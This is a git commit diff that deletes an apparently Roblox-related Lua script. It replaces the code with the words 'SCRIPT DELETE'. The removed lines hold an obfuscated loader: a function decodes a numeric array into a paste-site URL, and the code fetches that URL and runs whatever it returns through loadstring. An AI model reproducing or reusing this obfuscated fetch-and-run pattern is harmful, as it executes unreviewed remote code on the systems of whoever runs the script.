87468a2a8d975467adee5bd481cee76037232a21
khen791 <chakhenne@gmail.com>
2024-11-28 16:12:00 +0700

    Update why u ?.lua

--- why u ?.lua
+++ why u ?.lua
@@ -2,10 +2,5 @@
           HELLO IM KHEN AND SCRIPT SO GOOD!
           ACCOUNT: quayvebenanhdi 
           BAI!
-
+    SCRIPT DELETE
 ]]--
-
-function PehpJbklCjrRPYsrinVtVTesnXoYkwmJJehYIMPZkuUvJhpaZcYvvmqKUaRkHhWHHsayESNACNewUeX(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 
-
-
-loadstring(game:HttpGet(PehpJbklCjrRPYsrinVtVTesnXoYkwmJJehYIMPZkuUvJhpaZcYvvmqKUaRkHhWHHsayESNACNewUeX({10920,12180,12180,11760,12075,6090,4935,4935,11760,10185,12075,12180,10605,10710,12705,4830,10185,11760,11760,4935,9345,7560,5880,12495,12180,7245,12285,12075,4935,11970,10185,12495}), true))();
